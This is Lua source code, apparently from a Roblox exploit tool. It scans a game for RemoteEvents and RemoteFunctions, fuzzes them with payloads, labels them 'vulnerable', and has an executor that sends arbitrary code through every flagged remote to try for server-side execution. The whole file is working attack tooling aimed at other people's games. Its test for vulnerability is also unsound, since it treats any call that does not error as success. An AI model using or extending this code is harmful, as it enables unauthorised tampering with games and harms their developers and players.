local Scanner = {}

function Scanner:scan()
    print("\n[SCANNER] Starting comprehensive remote scan...")
    local startTime = tick()
    
    State.remotes = {}
    State.tested = {}
    
    -- Scan multiple services
    local services = {
        {name = "ReplicatedStorage", service = ReplicatedStorage},
        {name = "Workspace", service = Workspace},
        {name = "ServerScriptService", service = pcall(function() return game:GetService("ServerScriptService") end)},
        {name = "ServerStorage", service = pcall(function() return game:GetService("ServerStorage") end)},
    }
    
    for _, svc in ipairs(services) do
        if svc.service then
            self:deepScan(svc.service, 0, svc.name)
        end
    end
    
    State.stats.scanTime = tick() - startTime
    State.stats.totalScanned = 0
    for _ in pairs(State.remotes) do
        State.stats.totalScanned = State.stats.totalScanned + 1
    end
    
    print("[SCANNER] Scan complete!")
    print(string.format("[SCANNER] Found %d RemoteEvents/Functions in %.2fs", State.stats.totalScanned, State.stats.scanTime))
    
    return State.stats.totalScanned
end

function Scanner:deepScan(folder, depth, serviceName)
    if depth > 12 or not folder then return end
    
    pcall(function()
        for _, obj in pairs(folder:GetChildren()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local id = obj:GetFullName()
                if not State.remotes[id] then
                    State.remotes[id] = {
                        name = obj.Name,
                        path = obj:GetFullName(),
                        type = obj.ClassName,
                        service = serviceName,
                        depth = depth,
                        parent = folder.Name,
                        vulnerable = false,
                        payload = nil,
                        tested = false,
                        result = nil,
                        object = obj,
                    }
                end
            end
            self:deepScan(obj, depth + 1, serviceName)
        end
    end)
end

-- ============================================================
-- VULNERABILITY TESTER
-- ============================================================

local Tester = {}

function Tester:testAll()
    print("\n[TESTER] Starting vulnerability tests...")
    print("[TESTER] Testing " .. State.stats.totalScanned .. " remotes with fuzzing...")
    
    local startTime = tick()
    local vulnerable = 0
    
    for id, remote in pairs(State.remotes) do
        if not remote.object.Parent then
            State.remotes[id] = nil
            goto skip
        end
        
        local isVuln = self:testRemote(remote)
        if isVuln then
            vulnerable = vulnerable + 1
            State.vulnerable[id] = remote
        end
        
        ::skip::
    end
    
    State.stats.testsRun = State.stats.totalScanned
    State.stats.vulnerableFound = vulnerable
    
    print(string.format("[TESTER] Testing complete - %d/%d vulnerable (%.2fs)", 
        vulnerable, State.stats.totalScanned, tick() - startTime))
    
    return vulnerable
end

function Tester:testRemote(remote)
    if not remote.object or not remote.object.Parent then
        return false
    end
    
    -- Try basic payloads
    for i, payload in ipairs(State.payloads) do
        local success = false
        
        if remote.type == "RemoteEvent" then
            success = pcall(function()
                remote.object:FireServer(payload)
            end)
        elseif remote.type == "RemoteFunction" then
            success = pcall(function()
                remote.object:InvokeServer(payload)
            end)
        end
        
        if success then
            remote.vulnerable = true
            remote.payload = payload
            remote.tested = true
            return true
        end
    end
    
    remote.tested = true
    return false
end

-- ============================================================
-- EXECUTOR ENGINE
-- ============================================================

local Executor = {}

function Executor:execute(code, remoteId)
    if not code or code == "" then
        return false, "Empty code"
    end
    
    local remote = State.remotes[remoteId]
    if not remote or not remote.object or not remote.object.Parent then
        return false, "Remote not found or destroyed"
    end
    
    local success, result
    
    if remote.type == "RemoteEvent" then
        success, result = pcall(function()
            remote.object:FireServer(code)
            return "Code fired"
        end)
    elseif remote.type == "RemoteFunction" then
        success, result = pcall(function()
            return remote.object:InvokeServer(code)
        end)
    end
    
    if success then
        print(string.format("[EXEC] ✓ Executed via %s", remote.name))
        return true, result
    else
        print(string.format("[EXEC] ✗ Failed: %s", tostring(result)))
        return false, result
    end
end

function Executor:executeAll(code)
    if not code or code == "" then
        return 0, "Empty code"
    end
    
    local count = 0
    local errors = 0
    
    for id, remote in pairs(State.vulnerable) do
        local success, _ = self:execute(code, id)
        if success then
            count = count + 1
        else
            errors = errors + 1
        end
    end
    
    print(string.format("[EXEC] Executed on %d remotes (%d failed)", count, errors))
    return count
end

